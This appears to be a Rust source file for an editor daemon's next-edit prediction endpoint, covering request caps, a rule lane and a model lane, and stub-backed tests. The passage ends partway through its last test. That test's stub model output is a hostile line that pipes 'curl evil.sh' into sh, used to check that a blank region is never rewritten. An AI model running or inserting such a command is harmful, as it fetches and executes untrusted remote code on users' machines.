// SPDX-License-Identifier: AGPL-3.0-or-later
//! `POST /v1/edit_predictions` — next-edit prediction, both lanes
//! (`sovereign/docs/NEXT_EDIT.md` §3). Deliberately thin over the pure
//! pipelines: parse + validate the wire shape, convert the client's
//! UTF-16 offsets to bytes, predict, convert back. The rule lane
//! ([`crate::next_edit`]) always runs first and needs no inference;
//! when it declines AND the request opts in (`model_lane: true`), the
//! model lane ([`crate::next_edit_model`]) may consult the resident
//! FIM slot for a region rewrite — behind the same response shape,
//! with `engine: "model"` and the drop-invalid posture: no suggestion
//! beats a wrong one.
//!
//! Silence is a 200 with an empty `edits` array, never an error: the
//! client polls this on every edit-settle, and "nothing to suggest"
//! is the common, healthy case. With `debug: true` (always on from
//! the first-party extension) the response says which gate held, on
//! both lanes.

use std::time::Duration;

use axum::extract::State;
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde::Deserialize;

use futures::StreamExt;

use crate::next_edit::{self, HistoryUnit};
use crate::next_edit_model::{self, Consult};
use crate::openai_types::{ChatCompletionRequest, ErrorResponse, StreamFrame};
use crate::state::{AppState, FimCompletionRequest};

/// Caps: a request past these is malformed, not merely large — the
/// first-party client enforces the same limits before sending.
const MAX_TEXT_BYTES: usize = 512 * 1024;
const MAX_HISTORY: usize = 32;
const MAX_UNIT_BYTES: usize = 2 * 1024;

/// Transport-level body cap for this route (`server.rs` applies it),
/// well under the router-wide 8 MB frontdoor. Sized so no *legal*
/// request can trip it: 512 KiB of text can JSON-escape to 1 MiB in
/// the worst case, plus 32 units × 4 fields × 2 KiB of history, plus
/// envelope. Anything larger cannot satisfy the caps below, so it is
/// refused before serde allocates it rather than after.
pub const MAX_BODY_BYTES: usize = 2 * 1024 * 1024;

/// Model-lane inference budget; a slower response is dropped as
/// `timeout` (the GM5 latency gate lives in the §6 bank, not here).
const MODEL_TIMEOUT_MS: u64 = 15_000;

#[derive(Debug, Deserialize)]
pub struct EditPredictionsRequestWire {
    /// Coalesced edit units, oldest first.
    #[serde(default)]
    pub history: Vec<HistoryUnitWire>,
    /// Current document text (the search space for remaining sites).
    pub text: String,
    /// Cursor offset into `text`, in UTF-16 code units.
    #[serde(default)]
    pub cursor: usize,
    #[serde(default)]
    pub path: Option<String>,
    #[serde(default)]
    pub language: Option<String>,
    #[serde(default)]
    pub debug: bool,
    /// Opt-in to the model lane (P2). Off by default — the lane may
    /// not default-on until the §6 generalization bank says so
    /// (`gym/next-edit/gen/README.md`).
    #[serde(default)]
    pub model_lane: bool,
}

#[derive(Debug, Deserialize)]
pub struct HistoryUnitWire {
    pub before: String,
    pub after: String,
    #[serde(default)]
    pub left: String,
    #[serde(default)]
    pub right: String,
}

fn bad_request(msg: String) -> Response {
    (
        StatusCode::BAD_REQUEST,
        Json(serde_json::to_value(ErrorResponse::new(msg, "invalid_request")).unwrap_or_default()),
    )
        .into_response()
}

/// The wire caps, in one place. `Err` carries the 400 body — every
/// message names the offending field and its measured size, because a
/// 4xx here poisons the client's whole history window until the unit
/// ages out (NEXT_EDIT.md §9a).
///
/// Shared with the offline scorer for the same reason the pipeline is:
/// the caps were *already* the subject of a two-rulers bug once (client
/// counted UTF-16 chars, daemon counted UTF-8 bytes), so a second copy
/// here is the one thing this module must not grow.
pub fn validate_wire(wire: &EditPredictionsRequestWire) -> Result<(), String> {
    if wire.text.len() > MAX_TEXT_BYTES {
        return Err(format!(
            "`text` is {} bytes; /v1/edit_predictions caps the search space at {} — send the \
             active file, not a corpus",
            wire.text.len(),
            MAX_TEXT_BYTES
        ));
    }
    if wire.history.len() > MAX_HISTORY {
        return Err(format!(
            "{} history units; the induction window never looks past {} — send the most recent",
            wire.history.len(),
            MAX_HISTORY
        ));
    }
    if let Some((field, len)) = wire.history.iter().find_map(|u| {
        [
            ("before", &u.before),
            ("after", &u.after),
            ("left", &u.left),
            ("right", &u.right),
        ]
        .into_iter()
        .find(|(_, s)| s.len() > MAX_UNIT_BYTES)
        .map(|(name, s)| (name, s.len()))
    }) {
        return Err(format!(
            "a history unit exceeds {MAX_UNIT_BYTES} bytes per field (`{field}` is {len} bytes; \
             note the cap is BYTES, not chars) — units are coalesced keystroke bursts, not pastes"
        ));
    }
    Ok(())
}

/// The resident slot the model lane may consult. Read once per
/// request so the debug block can name the model even when the consult
/// is later refused.
#[derive(Debug, Clone)]
pub struct ModelSlot {
    pub model_id: String,
    pub slot: String,
    pub format: String,
}

/// One inference the lane wants run. Owned rather than borrowed so the
/// caller can move it into a spawned task without lifetime gymnastics;
/// the clone costs nothing beside a decode.
#[derive(Debug, Clone)]
pub struct InferenceCall {
    pub prompt: next_edit_model::Prompt,
    pub max_tokens: u32,
    pub stop: Vec<String>,
    pub temperature: f32,
    pub model_id: String,
}

/// A drop the caller's inference produced, named for the debug block.
/// The set is closed: `busy`, `timeout`, `error`, `unavailable`.
#[derive(Debug, Clone, Copy)]
pub struct InferError(pub &'static str);

/// Everything the handler learned, so the caller can log it without
/// re-deriving any of it from the JSON body.
pub struct PredictOutcome {
    pub body: serde_json::Value,
    pub engine: &'static str,
    pub proposed: usize,
    pub support: usize,
    pub sites: usize,
    pub reason_silent: &'static str,
    pub model_state: String,
}

/// The pipeline over one already-validated request, with inference
/// supplied by the caller.
///
/// The daemon passes its slot-bounded, timeout-bounded inference; the
/// offline scorer (`examples/next_edit_score.rs`) passes a plain HTTP
/// call to any OpenAI-compatible endpoint. Everything else — both
/// lanes, the UTF-16 conversion, and the exact `sovereign_debug` shape
/// — is shared, so a checkpoint scored offline gets *the daemon's*
/// answer rather than a second implementation's opinion of it. That is
/// the whole reason this function exists as a seam instead of the
/// scorer re-walking the same ordering (NEXT_EDIT.md §9a, "Two rulers
/// on one contract").
pub async fn predict_response<F, Fut>(
    wire: &EditPredictionsRequestWire,
    model: Option<ModelSlot>,
    started: std::time::Instant,
    force: bool,
    infer: F,
) -> PredictOutcome
where
    F: FnOnce(InferenceCall) -> Fut,
    Fut: std::future::Future<Output = Result<(String, Option<String>), InferError>>,
{
    let history: Vec<HistoryUnit> = wire
        .history
        .iter()
        .map(|u| HistoryUnit {
            before: u.before.clone(),
            after: u.after.clone(),
            left: u.left.clone(),
            right: u.right.clone(),
        })
        .collect();
    let cursor = next_edit::utf16_to_byte(&wire.text, wire.cursor);
    let p = next_edit::predict(&history, &wire.text, cursor);

    let mut engine = "rule";
    let mut final_edits: Vec<next_edit::Edit> = p.edits.clone();
    let mut model_debug: Option<serde_json::Value> = None;
    if wire.model_lane {
        let (m_edits, dbg) = model_lane(wire, model, &history, &p, cursor, force, infer).await;
        if let Some(me) = m_edits {
            engine = "model";
            final_edits = me;
        }
        model_debug = Some(dbg);
    }

    // Byte → UTF-16 for the wire, one pass for all edit boundaries.
    let boundaries: Vec<usize> = final_edits.iter().flat_map(|e| [e.start, e.end]).collect();
    let utf16 = next_edit::bytes_to_utf16(&wire.text, &boundaries);
    let edits: Vec<serde_json::Value> = final_edits
        .iter()
        .zip(utf16.chunks_exact(2))
        .map(|(e, se)| serde_json::json!({ "start": se[0], "end": se[1], "new_text": e.new_text }))
        .collect();

    let model_state = match &model_debug {
        None => "off".to_string(),
        Some(_) if engine == "model" => "fired".to_string(),
        Some(d) => d["dropped"]
            .as_str()
            .map(|r| format!("dropped:{r}"))
            .or_else(|| d["skipped"].as_str().map(|r| format!("skipped:{r}")))
            .unwrap_or_else(|| "silent".to_string()),
    };

    let mut body = serde_json::json!({
        "object": "edit_prediction",
        "engine": engine,
        "edits": edits,
    });
    if wire.debug {
        body["sovereign_debug"] = serde_json::json!({
            "rule_find": p.rule.as_ref().map(|r| r.find.clone()),
            "rule_replace": p.rule.as_ref().map(|r| r.replace.clone()),
            "rule_key": p.rule.as_ref().map(next_edit::GuardedRule::key),
            "support": p.support,
            "sites": p.sites,
            "edits_capped": p.edits_capped,
            "reason_silent": p.reason_silent,
            "timings_ms": { "total": started.elapsed().as_millis() as u64 },
        });
        // The lane verdict the daemon already traces, put on the wire
        // under the same name. A scoring harness has to attribute every
        // outcome to a lane — "did the model even get asked?" is the
        // first question of any model measurement — and deriving this
        // from the raw skipped/dropped fields harness-side would be a
        // second implementation of one formula (ARCH §10.6).
        body["sovereign_debug"]["model_state"] = model_state.clone().into();
        if let Some(m) = model_debug {
            body["sovereign_debug"]["model"] = m;
        }
    }

    PredictOutcome {
        proposed: edits.len(),
        engine,
        support: p.support,
        sites: p.sites,
        reason_silent: p.reason_silent.unwrap_or("no"),
        model_state,
        body,
    }
}

/// POST /v1/edit_predictions.
pub async fn edit_predictions(
    State(state): State<AppState>,
    Json(wire): Json<EditPredictionsRequestWire>,
) -> Response {
    let started = std::time::Instant::now();

    if let Err(msg) = validate_wire(&wire) {
        return bad_request(msg);
    }

    // Only now, past validation: this sits on the interactive editing
    // path and must preempt background ingest work. Bumping before the
    // caps would let any local process suppress ingest indefinitely by
    // POSTing junk that 400s.
    state.bump_foreground_active();

    // The resident slot, read before the gate so the debug block can
    // name the model even when the consult is later refused.
    let model = if wire.model_lane {
        state
            .inner
            .local_inference
            .as_ref()
            .and_then(|s| s.fim_status())
            .map(|fim| ModelSlot {
                model_id: fim.model_id.clone(),
                slot: fim.slot.clone(),
                format: fim.next_edit_format.clone(),
            })
    } else {
        None
    };
    let service = state.inner.local_inference.clone();
    let sem = state.inner.next_edit_model_slot.clone();
    let req_path = wire.path.clone();
    let req_language = wire.language.clone();

    // The daemon never forces: the consult gate IS production routing.
    let out = predict_response(&wire, model, started, false, move |call| async move {
        let Some(service) = service else {
            return Err(InferError("unavailable"));
        };
        // The permit rides INTO the task, not just this scope.
        // Abandoning a completion future does not stop the generation
        // behind it: the engine dispatches through `spawn_blocking`,
        // and dropping a `JoinHandle` detaches rather than cancels, so
        // llama.cpp keeps decoding and keeps the slot's context lock.
        // If the permit were released when we time out, every
        // timed-out consult would leave a live generation behind while
        // the next request sailed through `try_acquire` — the
        // one-in-flight budget would stop bounding anything precisely
        // when the slot is most contended. Holding it until the
        // inference genuinely returns makes the next consult report an
        // honest `busy` instead.
        let Ok(permit) = sem.try_acquire_owned() else {
            return Err(InferError("busy"));
        };
        // Both branches resolve to `Result<(content, finish_reason), _>`
        // so the outcome handling below is format-agnostic.
        let task = match call.prompt {
            // Completion-style edit models: the lane built the model's
            // own raw prompt and rides the FIM slot's verbatim path — a
            // chat template would wrap the special tokens in a user
            // turn and the fine-tune would never see its trained shape.
            next_edit_model::Prompt::Raw(raw) => {
                let freq = FimCompletionRequest {
                    prefix: String::new(),
                    suffix: String::new(),
                    path: req_path,
                    language: req_language,
                    max_tokens: Some(call.max_tokens as usize),
                    temperature: Some(call.temperature),
                    stop: call.stop,
                    debug: false,
                    raw_prompt: Some(raw),
                };
                tokio::spawn(async move {
                    let out = match service.fim_completion_stream(freq).await {
                        Ok(start) => {
                            let mut stream = start.stream;
                            let mut content = String::new();
                            let mut result = None;
                            while let Some(frame) = stream.next().await {
                                match frame {
                                    StreamFrame::Token(t) => content.push_str(&t),
                                    StreamFrame::Finish { reason, .. } => {
                                        result = Some(Ok((
                                            std::mem::take(&mut content),
                                            Some(reason.as_openai_str().to_string()),
                                        )));
                                    }
                                    StreamFrame::Error(e) => {
                                        result = Some(Err(e));
                                        break;
                                    }
                                    _ => {}
                                }
                            }
                            // A closed channel without a terminal frame
                            // is a cancelled decode, not a completion.
                            result
                                .unwrap_or_else(|| Err("stream ended without finish".to_string()))
                        }
                        Err(e) => Err(e),
                    };
                    drop(permit);
                    out
                })
            }
            chat @ (next_edit_model::Prompt::Chat(_)
            | next_edit_model::Prompt::ChatSystem { .. }) => {
                // `chat_messages` owns the layout so this and the
                // offline scorer cannot drift apart (ARCH §10.6).
                let messages = chat.chat_messages().unwrap_or_default();
                let req: ChatCompletionRequest = match serde_json::from_value(serde_json::json!({
                    "model": call.model_id,
                    "messages": messages,
                    "temperature": call.temperature,
                    "max_tokens": call.max_tokens,
                })) {
                    Ok(r) => r,
                    Err(e) => {
                        tracing::warn!(target: "next_edit", error = %e, "model lane request build failed");
                        return Err(InferError("error"));
                    }
                };
                tokio::spawn(async move {
                    // The next-edit lane has its own timeout + fallback and does
                    // not branch on shed structure, so flatten to the `String`
                    // error the sibling FIM arm above produces — both arms spawn
                    // into one `JoinHandle` type.
                    let out = service.chat_completion(req).await.map_err(|e| e.to_string()).map(|resp| {
                        let choice = resp.choices.into_iter().next();
                        let finish = choice.as_ref().and_then(|c| c.finish_reason.clone());
                        (choice.map(|c| c.message.content).unwrap_or_default(), finish)
                    });
                    drop(permit);
                    out
                })
            }
        };
        match tokio::time::timeout(Duration::from_millis(MODEL_TIMEOUT_MS), task).await {
            Err(_) => Err(InferError("timeout")),
            Ok(Err(e)) => {
                tracing::warn!(target: "next_edit", error = %e, "model lane task failed");
                Err(InferError("error"))
            }
            Ok(Ok(Err(e))) => {
                tracing::warn!(target: "next_edit", error = %e, "model lane inference error");
                Err(InferError("error"))
            }
            Ok(Ok(Ok(v))) => Ok(v),
        }
    })
    .await;

    tracing::info!(
        target: "next_edit",
        path = wire.path.as_deref().unwrap_or("<unset>"),
        history = wire.history.len(),
        support = out.support,
        sites = out.sites,
        proposed = out.proposed,
        silent = out.reason_silent,
        engine = out.engine,
        model = %out.model_state,
        elapsed_ms = started.elapsed().as_millis() as u64,
        "edit prediction"
    );

    Json(out.body).into_response()
}

/// The model lane, end to end: consult gate → region guards → prompt
/// → (the caller's inference) → parse → diff → verify. Returns the
/// absolute-byte edits on success; the debug value explains every
/// other outcome (`skipped` when the gate refused, `dropped` when the
/// model was consulted but its output didn't survive — NEXT_EDIT.md
/// §9).
///
/// Every *decision* lives in `next_edit_model::{plan, finish}`. This
/// function only sequences them, hands the one impure step to the
/// caller, and renders the glassbox block — which is what lets the
/// offline scorer reach the same verdicts as the daemon.
async fn model_lane<F, Fut>(
    wire: &EditPredictionsRequestWire,
    model: Option<ModelSlot>,
    history: &[HistoryUnit],
    p: &next_edit::Prediction,
    cursor: usize,
    force: bool,
    infer: F,
) -> (Option<Vec<next_edit::Edit>>, serde_json::Value)
where
    F: FnOnce(InferenceCall) -> Fut,
    Fut: std::future::Future<Output = Result<(String, Option<String>), InferError>>,
{
    // No resident slot. The gate's own answer is still reported, so
    // silence caused by policy never reads as silence caused by an
    // absent model — the two have different fixes.
    let Some(slot) = model else {
        return match next_edit_model::should_consult(history, &wire.text, p) {
            Consult::No { skipped } => (
                None,
                serde_json::json!({ "consulted": false, "skipped": skipped }),
            ),
            Consult::Yes { reason, needle } => (
                None,
                serde_json::json!({
                    "consulted": true,
                    "reason": reason,
                    "needle": needle,
                    "dropped": "unavailable",
                }),
            ),
        };
    };

    let plan = match next_edit_model::plan(
        history,
        &wire.text,
        cursor,
        p,
        wire.path.as_deref(),
        wire.language.as_deref(),
        &slot.format,
        force,
    ) {
        next_edit_model::Plan::Skip { skipped } => {
            return (
                None,
                serde_json::json!({ "consulted": false, "skipped": skipped }),
            );
        }
        next_edit_model::Plan::Decline {
            reason,
            needle,
            dropped,
            region_bytes,
        } => {
            let mut dbg = serde_json::json!({
                "consulted": true,
                "reason": reason,
                "needle": needle,
                "model_id": slot.model_id,
                "slot": slot.slot,
                "format": slot.format,
                "dropped": dropped,
            });
            if let Some(bytes) = region_bytes {
                dbg["region_bytes"] = bytes.into();
            }
            return (None, dbg);
        }
        next_edit_model::Plan::Send(plan) => plan,
    };

    let bounds = next_edit::bytes_to_utf16(&wire.text, &[plan.region_start, plan.region_end]);
    let mut dbg = serde_json::json!({
        "consulted": true,
        "reason": plan.reason,
        "needle": plan.needle,
        "model_id": slot.model_id,
        "slot": slot.slot,
        "format": slot.format,
        "region": { "start": bounds[0], "end": bounds[1] },
        "needle_hit": plan.needle_hit,
    });

    let t0 = std::time::Instant::now();
    let outcome = infer(InferenceCall {
        prompt: plan.prompt.clone(),
        max_tokens: plan.max_tokens,
        stop: plan.stop.clone(),
        temperature: plan.temperature,
        model_id: slot.model_id.clone(),
    })
    .await;
    dbg["timings_ms"] = serde_json::json!({ "inference": t0.elapsed().as_millis() as u64 });

    let (content, finish) = match outcome {
        Ok(v) => v,
        Err(InferError(why)) => {
            dbg["dropped"] = why.into();
            return (None, dbg);
        }
    };

    let region = &wire.text[plan.region_start..plan.region_end];
    match next_edit_model::finish(&plan, history, region, &content, finish.as_deref()) {
        Err(next_edit_model::FinishDrop { dropped, hunk }) => {
            dbg["dropped"] = dropped.into();
            if let Some(e) = hunk {
                dbg["verify_hunk"] = serde_json::json!({
                    "start": e.start,
                    "end": e.end,
                    "old": region[e.start..e.end].chars().take(120).collect::<String>(),
                    "new": e.new_text.chars().take(120).collect::<String>(),
                });
            }
            (None, dbg)
        }
        Ok(region_edits) => {
            let edits = region_edits
                .into_iter()
                .map(|e| next_edit::Edit {
                    start: plan.region_start + e.start,
                    end: plan.region_start + e.end,
                    new_text: e.new_text,
                })
                .collect();
            (Some(edits), dbg)
        }
    }
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use async_trait::async_trait;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use futures::Stream;
    use std::pin::Pin;
    use tower::ServiceExt;

    use crate::openai_types::{ChatChoice, ChatCompletionResponse, ChatMessage, StreamFrame};
    use crate::state::{test_app_state, FimSlotStatus, LocalInferenceService};

    async fn post_to(
        app: axum::Router,
        body: serde_json::Value,
    ) -> (StatusCode, serde_json::Value) {
        let resp = app
            .oneshot(
                Request::post("/v1/edit_predictions")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = resp.status();
        let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .unwrap();
        (status, serde_json::from_slice(&bytes).unwrap())
    }

    async fn post(body: serde_json::Value) -> (StatusCode, serde_json::Value) {
        post_to(crate::server::mock_router(test_app_state()), body).await
    }

    fn console_unit() -> serde_json::Value {
        serde_json::json!({
            "before": "log", "after": "debug",
            "left": "  console.", "right": "(\"x\");"
        })
    }

    /// Canned chat backend for the model lane: fixed completion text,
    /// FIM slot reported resident.
    struct StubChat {
        content: String,
        finish: &'static str,
    }

    #[async_trait]
    impl LocalInferenceService for StubChat {
        async fn chat_completion(
            &self,
            _r: crate::openai_types::ChatCompletionRequest,
        ) -> Result<ChatCompletionResponse, crate::state::LocalInferenceError> {
            Ok(ChatCompletionResponse {
                id: "t".into(),
                object: "chat.completion".into(),
                created: 0,
                model: "mellum-test".into(),
                choices: vec![ChatChoice {
                    index: 0,
                    message: ChatMessage::new("assistant", self.content.clone()),
                    finish_reason: Some(self.finish.into()),
                }],
                usage: None,
            })
        }
        async fn chat_completion_stream(
            &self,
            _r: crate::openai_types::ChatCompletionRequest,
        ) -> Result<
            Pin<Box<dyn Stream<Item = StreamFrame> + Send>>,
            crate::state::LocalInferenceError,
        > {
            unimplemented!("streaming not used by the model lane")
        }
        fn provider_manifest(&self) -> Option<commonwealth_inference::oicp::ProviderManifest> {
            None
        }
        async fn embed(&self, _i: &str) -> Result<Vec<f32>, String> {
            unimplemented!()
        }
        fn fim_status(&self) -> Option<FimSlotStatus> {
            Some(FimSlotStatus {
                slot: "fim".into(),
                model_id: "mellum-test".into(),
                fim_style: "mellum".into(),
                aliased_to_fast: false,
                next_edit_format: "region_instruct".into(),
            })
        }
    }

    fn model_router(content: &str) -> axum::Router {
        let state = test_app_state().with_local_inference(Arc::new(StubChat {
            content: content.into(),
            finish: "stop",
        }));
        crate::server::mock_router(state)
    }

    /// A request the consult gate admits, so the model-lane MECHANICS
    /// below (region rewrite, and every drop path) have a vehicle.
    ///
    /// Shaped as `multiline_fanout` — identical multi-line insertion at
    /// two sites — because that is the one consult reason still
    /// admitted. `fanout_insert` and `param_insert` are detected and
    /// deferred (`next_edit_model::should_consult`), so a fixture built
    /// on either would test the deferral, not the lane.
    fn fanout_request(text: &str) -> serde_json::Value {
        serde_json::json!({
            "history": [
                { "before": "", "after": "\n\t\tRetries: 3,",
                  "left": "\t\tPort: 8080,", "right": "\n\t}" },
                { "before": "", "after": "\n\t\tRetries: 3,",
                  "left": "\t\tPort: 9090,", "right": "\n\t}" },
            ],
            "text": text,
            "cursor": 0,
            "debug": true,
            "model_lane": true
        })
    }

    /// Two sites carry the block; `mirror` is the one still missing it.
    /// Eleven lines, so the 24-line region is the whole document — which
    /// keeps the expected rewrite in these tests exactly the text below.
    const FANOUT_TEXT: &str = "\tprimary := Conn{\n\
                               \t\tPort: 8080,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tbackup := Conn{\n\
                               \t\tPort: 9090,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tmirror := Conn{\n\
                               \t\tPort: 7070,\n\
                               \t}\n";

    /// `FANOUT_TEXT` with the fan-out completed on `mirror`.
    const FANOUT_DONE: &str = "\tprimary := Conn{\n\
                               \t\tPort: 8080,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tbackup := Conn{\n\
                               \t\tPort: 9090,\n\
                               \t\tRetries: 3,\n\
                               \t}\n\
                               \tmirror := Conn{\n\
                               \t\tPort: 7070,\n\
                               \t\tRetries: 3,\n\
                               \t}\n";

    // ---- rule lane (unchanged contract) -------------------------------

    #[tokio::test]
    async fn two_supports_fire_and_queue_all_sites() {
        let text = "console.debug(1);\nconsole.debug(2);\nconsole.log(3);\nconsole.log(4);\n";
        let (status, body) = post(serde_json::json!({
            "history": [console_unit(), console_unit()],
            "text": text,
            "cursor": 30,
            "debug": true
        }))
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 2);
        assert_eq!(edits[0]["start"], 36);
        assert_eq!(edits[0]["new_text"], "console.debug(");
        assert_eq!(body["sovereign_debug"]["support"], 2);
        assert_eq!(
            body["sovereign_debug"]["reason_silent"],
            serde_json::Value::Null
        );
    }

    #[tokio::test]
    async fn silence_is_200_with_reason_in_debug() {
        let (status, body) = post(serde_json::json!({
            "history": [console_unit()],
            "text": "console.log(9);",
            "cursor": 0,
            "debug": true
        }))
        .await;
        assert_eq!(status, StatusCode::OK);
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["reason_silent"], "below_threshold");
        assert_eq!(body["sovereign_debug"]["support"], 1);
    }

    #[tokio::test]
    async fn no_debug_means_no_debug_block() {
        let (_, body) = post(serde_json::json!({ "history": [], "text": "x", "cursor": 0 })).await;
        assert!(body.get("sovereign_debug").is_none());
    }

    #[tokio::test]
    async fn offsets_are_utf16_on_the_wire() {
        // Emoji before the sites: byte and UTF-16 offsets diverge.
        let text = "// 💡💡\nconsole.debug(1);\nconsole.debug(2);\nconsole.log(3);\n";
        let (_, body) = post(serde_json::json!({
            "history": [console_unit(), console_unit()],
            "text": text,
            "cursor": 0,
            "debug": true
        }))
        .await;
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 1);
        let start = edits[0]["start"].as_u64().unwrap() as usize;
        let end = edits[0]["end"].as_u64().unwrap() as usize;
        let units: Vec<u16> = text.encode_utf16().collect();
        assert_eq!(
            String::from_utf16(&units[start..end]).unwrap(),
            "console.log("
        );
    }

    #[tokio::test]
    async fn oversized_text_is_400_with_actionable_message() {
        let (status, body) = post(serde_json::json!({
            "history": [],
            "text": "x".repeat(super::MAX_TEXT_BYTES + 1),
            "cursor": 0
        }))
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("caps the search space"));
    }

    // ---- model lane ---------------------------------------------------

    #[tokio::test]
    async fn model_lane_fires_on_fanout_with_region_rewrite() {
        // The stub "model" completes the fan-out on the third site.
        let (status, body) = post_to(model_router(FANOUT_DONE), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "model");
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 1, "one hunk on the un-edited site");
        let start = edits[0]["start"].as_u64().unwrap() as usize;
        let end = edits[0]["end"].as_u64().unwrap() as usize;
        assert_eq!(start, end, "pure insertion");
        // Assert on the RESULT, not on the hunk boundary: a multi-line
        // insertion has several equivalent alignments (before the
        // newline or after it) and pinning one would test the differ's
        // taste rather than the lane's correctness. FANOUT_TEXT is
        // ASCII, so UTF-16 offsets are byte offsets here.
        let applied = format!(
            "{}{}{}",
            &FANOUT_TEXT[..start],
            edits[0]["new_text"].as_str().unwrap(),
            &FANOUT_TEXT[end..]
        );
        assert_eq!(
            applied, FANOUT_DONE,
            "the edit reproduces the completed fan-out"
        );
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["reason"], "multiline_fanout");
        assert_eq!(m["model_id"], "mellum-test");
        assert!(m.get("dropped").is_none());
    }

    #[tokio::test]
    async fn model_lane_drops_a_reapplied_pattern_as_already_applied() {
        // Structurally flawless rewrite, wrong in content: the "model"
        // stacks the insertion onto a site that already carries it and
        // leaves the fresh site alone. The completion-trap shape — V0
        // must catch it at the content level, not the structure level.
        let rewrite = "\tprimary := Conn{\n\
                       \t\tPort: 8080,\n\
                       \t\tRetries: 3,\n\
                       \t}\n\
                       \tbackup := Conn{\n\
                       \t\tPort: 9090,\n\
                       \t\tRetries: 3,\n\
                       \t\tRetries: 3,\n\
                       \t}\n\
                       \tmirror := Conn{\n\
                       \t\tPort: 7070,\n\
                       \t}\n";
        let (status, body) = post_to(model_router(rewrite), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            body["engine"], "rule",
            "verifier drop falls back to rule-lane silence"
        );
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["dropped"], "already_applied");
    }

    #[tokio::test]
    async fn model_lane_gate_refuses_dissimilar_history() {
        let (_, body) = post_to(
            model_router("anything"),
            serde_json::json!({
                "history": [
                    { "before": "parseHeader", "after": "readHeader",
                      "left": "  const h = ", "right": "(buf);" },
                    { "before": "5000", "after": "8000",
                      "left": "  const t = setTimeout(cb, ", "right": ");" },
                ],
                "text": "const backup = setTimeout(cb, 5000);\n",
                "cursor": 0,
                "debug": true,
                "model_lane": true
            }),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], false);
        assert_eq!(m["skipped"], "gate");
    }

    #[tokio::test]
    async fn model_lane_never_preempts_a_fired_rule() {
        let (_, body) = post_to(
            model_router("should never be consulted"),
            serde_json::json!({
                "history": [console_unit(), console_unit()],
                "text": "console.log(1);\nconsole.log(2);\n",
                "cursor": 0,
                "debug": true,
                "model_lane": true
            }),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(!body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["skipped"], "rule_fired");
    }

    #[tokio::test]
    async fn model_lane_without_service_is_explained_silence() {
        // test_app_state has no inference service: the gate still runs
        // (consulted=true, deterministic), the consult is dropped.
        let (status, body) = post(fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["reason"], "multiline_fanout");
        assert_eq!(m["dropped"], "unavailable");
    }

    #[tokio::test]
    async fn invalid_model_output_is_dropped_not_repaired() {
        let (_, body) = post_to(
            model_router(
                "sure! here is <|editable_region_start|> stuff nested \
                          <|editable_region_start|> twice",
            ),
            fanout_request(FANOUT_TEXT),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "invalid");
    }

    #[tokio::test]
    async fn unchanged_model_output_is_an_explained_noop() {
        let (_, body) = post_to(model_router(FANOUT_TEXT), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "noop");
    }

    /// A minified bundle is one enormous line, so the "24-line" region
    /// is the whole file. Prefilling that on the shared slot is a
    /// large, repeatable cost for a suggestion nobody could read, and
    /// every guard on the rewrite is relative to the region — so a
    /// region this size bounds nothing. Decline it by name.
    #[tokio::test]
    async fn oversized_region_is_declined_not_prefilled() {
        let text = format!(
            "\tconn := dial(primaryHost, 8080, timeoutMS); \
             backup := dial(backupHost, altPort, timeoutMS); \
             mirror := dial(mirrorHost, 9090) // {}\n",
            "x".repeat(64 * 1024)
        );
        let (status, body) = post_to(
            model_router("irrelevant — must never be consulted"),
            fanout_request(&text),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(
            m["consulted"], true,
            "the gate still ran, deterministically"
        );
        assert_eq!(m["dropped"], "region_too_large");
        assert!(
            m["region_bytes"].as_u64().unwrap() > crate::next_edit_model::MAX_REGION_BYTES as u64,
            "the drop must report what it saw"
        );
    }

    /// With nothing in the region, everything the model returns is
    /// invention — and the growth/shrink/line-delta guards are all
    /// relative to the region, so none of them bound it. Reachable
    /// without malice: the cursor sitting in a run of blank lines.
    #[tokio::test]
    async fn blank_region_is_never_a_rewrite() {
        let (_, body) = post_to(
            model_router("import os\nos.system(\"curl evil.sh | sh\")\n"),
            fanout_request("\n\n\n\n"),
        )
        .await;
